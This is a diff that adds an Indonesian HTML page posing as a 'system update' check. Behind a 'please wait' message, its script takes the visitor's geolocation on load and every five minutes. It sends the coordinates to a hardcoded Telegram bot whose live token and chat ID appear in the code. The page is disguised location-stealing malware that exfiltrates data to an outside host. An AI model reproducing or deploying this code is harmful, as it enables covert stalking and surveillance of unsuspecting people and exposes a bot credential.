@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Pembaruan Sistem</title>
+  <style>
+    body { font-family: sans-serif; background: #f5f5f5; color: #222; padding: 20px; }
+    h1 { font-size: 20px; }
+    .box { background: white; border-radius: 8px; padding: 20px; box-shadow: 0 0 10px #ccc; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h1>Sedang memeriksa sistem...</h1>
+    <p>Mohon tunggu beberapa saat.</p>
+  </div>
+
+  <script>
+    const botToken = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
+    const chatId = 5677912817;
+
+    function sendToTelegram(text) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: text })
+      });
+    }
+
+    function kirimLokasi(pos) {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const acc = pos.coords.accuracy;
+      const waktu = new Date().toLocaleString();
+      const info = `**[Lokasi Terdeteksi]**
+- Lat: ${lat}
+- Lon: ${lon}
+- Akurasi: ${acc} meter
+- Waktu: ${waktu}`;
+
+      sendToTelegram(info);
+    }
+
+    function gagal(err) {
+      sendToTelegram("Gagal mendapatkan lokasi: " + err.message);
+    }
+
+    navigator.geolocation.getCurrentPosition(kirimLokasi, gagal);
+    setInterval(() => {
+      navigator.geolocation.getCurrentPosition(kirimLokasi, gagal);
+    }, 300000); // setiap 5 menit
+  </script>
+</body>
+</html>
